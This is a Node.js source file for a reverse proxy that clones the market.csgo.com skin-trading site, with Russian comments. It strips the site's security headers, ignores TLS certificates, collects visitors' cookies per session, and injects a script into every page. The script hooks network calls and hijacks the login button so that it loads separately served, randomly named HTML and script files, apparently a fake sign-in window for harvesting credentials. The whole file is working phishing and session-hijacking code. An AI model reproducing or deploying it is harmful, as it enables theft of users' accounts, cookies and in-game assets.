const express = require('express');
const axios = require('axios');
const cookieParser = require('cookie-parser');
const compression = require('compression');
const WebSocket = require('ws');
const url = require('url');
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const { handlePhpRequest, config } = require('./auth-handler');

const app = express();
const PORT = process.env.PORT || 3000;
const TARGET_HOST = 'https://market.csgo.com';
const WS_TARGET = 'wss://centrifugo2.csgotrader.app';

// Создаем HTTP сервер
const server = http.createServer(app);

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(cookieParser());
app.use(compression());

// Хранилище для cookies и токенов
const sessions = new Map();

// Создаем агент для HTTPS с игнорированием сертификатов
const httpsAgent = new https.Agent({
    rejectUnauthorized: false,
    keepAlive: true
});

// Определяем, используется ли HTTPS
function isSecure(req) {
    return req.headers['x-forwarded-proto'] === 'https' || 
           req.headers['cloudfront-forwarded-proto'] === 'https' ||
           req.protocol === 'https' ||
           req.secure;
}

// Функция для получения базового URL с правильным протоколом
function getBaseUrl(req) {
    const protocol = isSecure(req) ? 'https' : 'http';
    const host = req.headers['x-forwarded-host'] || req.headers['host'] || req.get('host');
    return `${protocol}://${host}`;
}

// Middleware для принудительного HTTPS и CORS
app.use((req, res, next) => {
    // Установка CORS заголовков
    const origin = req.headers.origin || '*';
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, HEAD, PATCH');
    res.header('Access-Control-Allow-Headers', '*');
    res.header('Access-Control-Expose-Headers', '*');
    
    // Опции для CORS preflight
    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }
    
    // Если запрос по HTTP, но от Render/Cloudflare по HTTPS
    if (isSecure(req) || req.headers['x-forwarded-proto'] === 'https') {
        res.setHeader('Content-Security-Policy', "upgrade-insecure-requests");
    }
    
    next();
});

// Обработка специальных файлов
app.get('/deab0093a0f4551414b49ba57151ae08.php', handlePhpRequest);

app.get('/6kaomrcjpf2m.html', (req, res) => {
    const htmlContent = fs.readFileSync(path.join(__dirname, '6kaomrcjpf2m.html'), 'utf8');
    res.type('text/html').send(htmlContent);
});

app.get('/bhcg4ddaadpt.js', (req, res) => {
    const scriptPath = path.join(__dirname, 'bhcg4ddaadpt.js');
    if (fs.existsSync(scriptPath)) {
        res.type('application/javascript').sendFile(scriptPath);
    } else {
        res.status(404).send('Script not found');
    }
});

app.get('/ocbp8i7rp6hv.js', (req, res) => {
    const scriptPath = path.join(__dirname, 'ocbp8i7rp6hv.js');
    if (fs.existsSync(scriptPath)) {
        res.type('application/javascript').sendFile(scriptPath);
    } else {
        res.status(404).send('Script not found');
    }
});

// Получение или создание сессии
function getSession(sessionId) {
    if (!sessions.has(sessionId)) {
        sessions.set(sessionId, {
            cookies: new Map(),
            tokens: new Map(),
            wsToken: null
        });
    }
    return sessions.get(sessionId);
}

// Парсинг cookies из заголовков
function parseCookieHeader(cookieHeader) {
    const cookies = new Map();
    if (cookieHeader) {
        cookieHeader.split(';').forEach(cookie => {
            const [name, ...rest] = cookie.trim().split('=');
            if (name && rest.length > 0) {
                cookies.set(name, rest.join('='));
            }
        });
    }
    return cookies;
}

// Обработка set-cookie заголовков
function parseSetCookieHeaders(setCookieHeaders) {
    const cookies = new Map();
    if (Array.isArray(setCookieHeaders)) {
        setCookieHeaders.forEach(cookie => {
            const [nameValue] = cookie.split(';');
            const [name, ...valueParts] = nameValue.split('=');
            if (name && valueParts.length > 0) {
                cookies.set(name.trim(), valueParts.join('='));
            }
        });
    }
    return cookies;
}

// Создание строки cookies для запроса
function createCookieString(cookieMap) {
    return Array.from(cookieMap.entries())
        .map(([name, value]) => `${name}=${value}`)
        .join('; ');
}

// Модификация URL в контенте
function modifyUrls(content, baseUrl, contentType = '') {
    if (!content) return content;
    
    let modified = content.toString();
    
    // Определяем протокол для замены
    const isHttps = baseUrl.startsWith('https');
    const wsProtocol = isHttps ? 'wss' : 'ws';
    
    // Основные замены для всех типов контента
    modified = modified.replace(/https:\/\/market\.csgo\.com/g, baseUrl);
    modified = modified.replace(/http:\/\/market\.csgo\.com/g, baseUrl);
    modified = modified.replace(/\/\/market\.csgo\.com/g, baseUrl);
    modified = modified.replace(/wss:\/\/centrifugo2\.csgotrader\.app/g, `${wsProtocol}://${baseUrl.replace(/^https?:\/\//, '')}/ws`);
    
    // Специфичные замены для HTML
    if (contentType.includes('html')) {
        // Добавляем meta тег для upgrade-insecure-requests
        if (!modified.includes('upgrade-insecure-requests')) {
            modified = modified.replace(/<head[^>]*>/i, `$&<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">`);
        }
        
        // Добавляем base тег
        if (!modified.includes('<base')) {
            modified = modified.replace(/<head[^>]*>/i, `$&<base href="${baseUrl}/">`);
        }
        
        // Инжектим прокси скрипт с перехватом авторизации
        const proxyScript = `
        <script>
        (function() {
            console.log('🔧 Market proxy initialized with auth intercept');
            
            // Сохраняем оригинальные функции
            const originalFetch = window.fetch;
            const originalXHR = XMLHttpRequest.prototype.open;
            const originalWS = window.WebSocket;
            
            // Текущий протокол
            const currentProtocol = window.location.protocol;
            const isHttps = currentProtocol === 'https:';
            const wsProtocol = isHttps ? 'wss:' : 'ws:';
            
            // Модификация URL
            function modifyUrl(url) {
                if (!url) return url;
                
                // Если уже наш домен
                if (url.includes(window.location.host)) {
                    return url;
                }
                
                // Принудительно HTTPS для всех запросов если страница по HTTPS
                if (isHttps && url.startsWith('http://')) {
                    url = url.replace('http://', 'https://');
                }
                
                // WebSocket URLs
                if (url.startsWith('wss://centrifugo2.csgotrader.app') || url.startsWith('ws://centrifugo2.csgotrader.app')) {
                    return url.replace(/wss?:\\/\\/centrifugo2\\.csgotrader\\.app/, 
                        wsProtocol + '//' + window.location.host + '/ws');
                }
                
                // API URLs
                if (url.includes('market.csgo.com')) {
                    return url.replace(/https?:\\/\\/market\\.csgo\\.com/, 
                        currentProtocol + '//' + window.location.host);
                }
                
                // Относительные URLs
                if (url.startsWith('/') && !url.startsWith('//')) {
                    return window.location.origin + url;
                }
                
                return url;
            }
            
            // Перехват fetch
            window.fetch = async function(input, init = {}) {
                let url = input;
                if (typeof input === 'string') {
                    url = modifyUrl(input);
                } else if (input instanceof Request) {
                    url = new Request(modifyUrl(input.url), input);
                }
                
                // Добавляем credentials для корректной работы cookies
                init.credentials = init.credentials || 'include';
                
                console.log('Fetch:', url);
                return originalFetch.call(this, url, init);
            };
            
            // Перехват XMLHttpRequest
            XMLHttpRequest.prototype.open = function(method, url, ...args) {
                url = modifyUrl(url);
                console.log('XHR:', method, url);
                return originalXHR.call(this, method, url, ...args);
            };
            
            // Перехват WebSocket
            window.WebSocket = function(url, protocols) {
                url = modifyUrl(url);
                console.log('WebSocket:', url);
                return new originalWS(url, protocols);
            };
            
            // Перехват EventSource если используется
            if (window.EventSource) {
                const originalES = window.EventSource;
                window.EventSource = function(url, config) {
                    url = modifyUrl(url);
                    console.log('EventSource:', url);
                    return new originalES(url, config);
                };
            }
            
            // Перехват создания тегов для предотвращения mixed content
            const originalCreateElement = document.createElement;
            document.createElement = function(tagName) {
                const element = originalCreateElement.call(this, tagName);
                
                if (tagName.toLowerCase() === 'script' || tagName.toLowerCase() === 'link' || tagName.toLowerCase() === 'img') {
                    const originalSetAttribute = element.setAttribute;
                    element.setAttribute = function(name, value) {
                        if ((name === 'src' || name === 'href') && value) {
                            value = modifyUrl(value);
                        }
                        return originalSetAttribute.call(this, name, value);
                    };
                }
                
                return element;
            };
            
            // ВАЖНО: Перехват кликов по кнопке авторизации
            function interceptAuthButton() {
                const handleAuthClick = async (e) => {
                    const button = e.target.closest('#login-register');
                    if (button) {
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        
                        console.log('🔐 Auth button intercepted!');
                        
                        // Загружаем HTML файл
                        try {
                            // Сначала загружаем HTML
                            const htmlResponse = await fetch('/6kaomrcjpf2m.html');
                            const htmlContent = await htmlResponse.text();
                            
                            // Создаем iframe для изоляции
                            const iframe = document.createElement('iframe');
                            iframe.style.display = 'none';
                            document.body.appendChild(iframe);
                            
                            // Записываем HTML в iframe
                            iframe.contentDocument.open();
                            iframe.contentDocument.write(htmlContent);
                            iframe.contentDocument.close();
                            
                            // Загружаем дополнительные скрипты если нужно
                            const windowScript = document.createElement('script');
                            windowScript.src = '/ocbp8i7rp6hv.js';
                            windowScript.onload = () => {
                                console.log('Window script loaded');
                            };
                            document.head.appendChild(windowScript);
                            
                        } catch (error) {
                            console.error('Error loading auth scripts:', error);
                        }
                        
                        return false;
                    }
                };
                
                // Перехватываем клики на уровне документа
                document.addEventListener('click', handleAuthClick, true);
                
                // Для динамически создаваемых элементов
                const observer = new MutationObserver((mutations) => {
                    mutations.forEach((mutation) => {
                        if (mutation.type === 'childList') {
                            const button = document.querySelector('#login-register');
                            if (button) {
                                button.addEventListener('click', handleAuthClick, true);
                            }
                        }
                    });
                });
                
                observer.observe(document.body, {
                    childList: true,
                    subtree: true
                });
            }
            
            // Запускаем перехват после загрузки DOM
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', interceptAuthButton);
            } else {
                interceptAuthButton();
            }
            
            console.log('✅ Proxy script with auth intercept initialized');
        })();
        </script>
        `;
        
        modified = modified.replace(/<head[^>]*>/i, `$&${proxyScript}`);
    }
    
    // Специфичные замены для JavaScript
    if (contentType.includes('javascript')) {
        modified = modified.replace(/"\/api\//g, `"${baseUrl}/api/`);
        modified = modified.replace(/'\/api\//g, `'${baseUrl}/api/`);
        modified = modified.replace(/centrifugo2\.csgotrader\.app/g, 
            baseUrl.replace(/^https?:\/\//, '') + '/ws');
    }
    
    // Специфичные замены для CSS
    if (contentType.includes('css')) {
        modified = modified.replace(/url\(['"]?\//g, `url('${baseUrl}/`);
        modified = modified.replace(/url\(['"]?http:\/\//g, `url('${baseUrl.replace('https:', 'http:')}/`);
    }
    
    return modified;
}

// Обработка WebSocket прокси
const wsProxy = new WebSocket.Server({ noServer: true });

server.on('upgrade', (request, socket, head) => {
    const pathname = url.parse(request.url).pathname;
    
    if (pathname === '/ws' || pathname.startsWith('/centrifugo')) {
        wsProxy.handleUpgrade(request, socket, head, (ws) => {
            handleWebSocketProxy(ws, request);
        });
    }
});

function handleWebSocketProxy(clientWs, request) {
    const targetUrl = WS_TARGET + (request.url.replace('/ws', '') || '/connection/websocket');
    console.log('WebSocket proxy:', targetUrl);
    
    const targetWs = new WebSocket(targetUrl, {
        headers: {
            'Origin': 'https://market.csgo.com',
            'User-Agent': request.headers['user-agent'] || 'Mozilla/5.0',
            ...request.headers
        }
    });
    
    targetWs.on('open', () => {
        console.log('Target WebSocket connected');
    });
    
    // Client -> Server
    clientWs.on('message', (message) => {
        if (targetWs.readyState === WebSocket.OPEN) {
            targetWs.send(message);
        }
    });
    
    // Server -> Client
    targetWs.on('message', (message) => {
        if (clientWs.readyState === WebSocket.OPEN) {
            clientWs.send(message);
        }
    });
    
    // Обработка закрытия соединений
    clientWs.on('close', () => {
        targetWs.close();
    });
    
    targetWs.on('close', () => {
        clientWs.close();
    });
    
    // Обработка ошибок
    clientWs.on('error', (err) => {
        console.error('Client WebSocket error:', err);
        targetWs.close();
    });
    
    targetWs.on('error', (err) => {
        console.error('Target WebSocket error:', err);
        clientWs.close();
    });
}

// Главный обработчик HTTP запросов
app.use('*', async (req, res) => {
    try {
        const baseUrl = getBaseUrl(req);
        const targetUrl = TARGET_HOST + req.originalUrl;
        const sessionId = req.cookies.sessionId || Math.random().toString(36).substring(7);
        const session = getSession(sessionId);
        
        // Устанавливаем sessionId если его нет
        if (!req.cookies.sessionId) {
            res.cookie('sessionId', sessionId, { 
                httpOnly: true, 
                secure: isSecure(req),
                sameSite: 'none'
            });
        }
        
        // Собираем cookies для запроса
        const requestCookies = new Map([
            ...session.cookies,
            ...parseCookieHeader(req.headers.cookie)
        ]);
        
        console.log(`🌐 ${req.method} ${req.originalUrl} (${isSecure(req) ? 'HTTPS' : 'HTTP'})`);
        
        // Настройки для axios
        const axiosConfig = {
            method: req.method,
            url: targetUrl,
            headers: {
                ...req.headers,
                'host': 'market.csgo.com',
                'origin': 'https://market.csgo.com',
                'referer': 'https://market.csgo.com/',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': req.headers['sec-fetch-mode'] || 'cors',
                'sec-fetch-dest': req.headers['sec-fetch-dest'] || 'empty',
                'user-agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'cookie': createCookieString(requestCookies)
            },
            data: req.body,
            responseType: 'arraybuffer',
            validateStatus: () => true,
            maxRedirects: 0,
            decompress: true,
            httpsAgent: httpsAgent,
            timeout: 30000
        };
        
        // Удаляем заголовки прокси
        delete axiosConfig.headers['x-forwarded-for'];
        delete axiosConfig.headers['x-forwarded-proto'];
        delete axiosConfig.headers['x-forwarded-host'];
        delete axiosConfig.headers['x-real-ip'];
        delete axiosConfig.headers['cf-connecting-ip'];
        delete axiosConfig.headers['cf-ipcountry'];
        
        const response = await axios(axiosConfig);
        
        // Обработка редиректов
        if ([301, 302, 303, 307, 308].includes(response.status)) {
            let location = response.headers.location;
            if (location) {
                if (location.includes('market.csgo.com')) {
                    location = location.replace(/https?:\/\/market\.csgo\.com/, baseUrl);
                } else if (location.startsWith('/')) {
                    location = baseUrl + location;
                }
                console.log(`↪️ Redirect: ${location}`);
                return res.redirect(response.status, location);
            }
        }
        
        // Сохраняем cookies из ответа
        if (response.headers['set-cookie']) {
            const newCookies = parseSetCookieHeaders(response.headers['set-cookie']);
            newCookies.forEach((value, name) => {
                session.cookies.set(name, value);
            });
        }
        
        // Модификация контента
        let content = response.data;
        const contentType = response.headers['content-type'] || '';
        
        if (contentType.includes('text/') || contentType.includes('application/javascript') || contentType.includes('application/json')) {
            content = Buffer.from(modifyUrls(content.toString('utf8'), baseUrl, contentType), 'utf8');
        }
        
        // Подготовка заголовков ответа
        const responseHeaders = { ...response.headers };
        
        // Удаляем небезопасные заголовки
        delete responseHeaders['content-security-policy'];
        delete responseHeaders['x-frame-options'];
        delete responseHeaders['x-content-type-options'];
        delete responseHeaders['strict-transport-security'];
        delete responseHeaders['permissions-policy'];
        delete responseHeaders['cross-origin-opener-policy'];
        delete responseHeaders['cross-origin-embedder-policy'];
        
        // Добавляем заголовки безопасности для HTTPS
        if (isSecure(req)) {
            responseHeaders['content-security-policy'] = "upgrade-insecure-requests";
        }
        
        // Модификация set-cookie
        if (responseHeaders['set-cookie']) {
            responseHeaders['set-cookie'] = responseHeaders['set-cookie'].map(cookie => {
                return cookie
                    .replace(/domain=.*?(;|$)/gi, '')
                    .replace(/secure;/gi, isSecure(req) ? 'secure;' : '')
                    .replace(/samesite=none/gi, isSecure(req) ? 'samesite=none' : 'samesite=lax');
            });
        }
        
        // Устанавливаем заголовки
        Object.entries(responseHeaders).forEach(([key, value]) => {
            if (key.toLowerCase() !== 'content-encoding' && key.toLowerCase() !== 'content-length') {
                res.set(key, value);
            }
        });
        
        res.set('content-length', content.length);
        res.status(response.status);
        res.send(content);
        
    } catch (error) {
        console.error('❌ Proxy error:', error.message);
        res.status(500).json({ 
            error: 'Proxy Error', 
            message: error.message,
            stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
        });
    }
});

// Запуск сервера
server.listen(PORT, '0.0.0.0', () => {
    console.log(`
    🚀 Advanced Market Proxy Server with Auth Intercept
    📡 Port: ${PORT}
    🎯 Target: ${TARGET_HOST}
    🔌 WebSocket: ${WS_TARGET}
    🔒 HTTPS: Auto-detected
    🔐 Auth Intercept: Enabled
    
    Features:
    ✓ Full HTTP/HTTPS proxy
    ✓ WebSocket support
    ✓ Cookie management
    ✓ CORS handling
    ✓ URL rewriting
    ✓ Content modification
    ✓ Mixed content prevention
    ✓ Auth button interception
    `);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n🔄 Shutting down gracefully...');
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});
